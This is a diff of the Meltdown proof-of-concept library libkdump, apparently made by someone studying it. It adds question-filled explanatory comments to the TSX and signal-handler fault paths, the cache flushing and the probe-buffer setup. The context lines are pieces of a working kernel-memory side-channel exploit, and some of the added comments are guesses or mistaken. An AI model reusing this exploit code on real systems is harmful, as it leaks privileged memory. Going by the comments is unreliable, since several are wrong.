@@ -161,6 +161,7 @@ static inline uint64_t rdtsc() {
 #if defined(__x86_64__)
 // ---------------------------------------------------------------------------
 static inline void maccess(void *p) {
+  //Move from register (quadword 64-bit) 0 to register rax (64-bit quadword)
   asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
 }
 
@@ -374,16 +375,19 @@ int libkdump_init(const libkdump_config_t configuration) {
     errno = err;
     return -1;
   }
-  _mem = malloc(4096 * 300);
+  //4kb data address accesses???
+  _mem = malloc(4096 * 300); //153 kbytes?
   if (!_mem) {
     errno = ENOMEM;
     return -1;
   }
   mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
-  memset(mem, 0xab, 4096 * 290);
+  memset(mem, 0xab, 4096 * 290); //sets everything up until the 148th kilobyte 
 
   for (j = 0; j < 256; j++) {
-    flush(mem + j * 4096);
+    //call clflush
+    //"clflush 0(%0)\n" : : "c"(p) : "rax"
+    flush(mem + j * 4096); // flush every 4kb?
   }
 
   load_thread = malloc(sizeof(pthread_t) * config.load_threads);
@@ -481,8 +485,10 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
   uint64_t start = 0, end = 0;
 
   while (retries--) {
+    //meltdown happens within the thread negotiation of the load/store commands
+    //does this setup in a certain way? 
     if (xbegin() == _XBEGIN_STARTED) {
-      MELTDOWN;
+      MELTDOWN; 
       xend();
     }
     int i;
@@ -507,6 +513,7 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
 
   while (retries--) {
     if (!setjmp(buf)) {
+      //jump to meltdown
       MELTDOWN;
     }
 
@@ -525,6 +532,7 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
 }
 
 // ---------------------------------------------------------------------------
+//no optimizations for gcc at all?
 int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
   phys = addr;
 
@@ -533,12 +541,16 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
   for (i = 0; i < 256; i++)
     res_stat[i] = 0;
 
+  //something to do with priority of the current thread
   sched_yield();
 
+  //make config.measurement number of measurements
   for (i = 0; i < config.measurements; i++) {
     if (config.fault_handling == TSX) {
+      //read using TSX
       r = libkdump_read_tsx();
     } else {
+      //otherwise read using normal fault handling?
       r = libkdump_read_signal_handler();
     }
     res_stat[r]++;
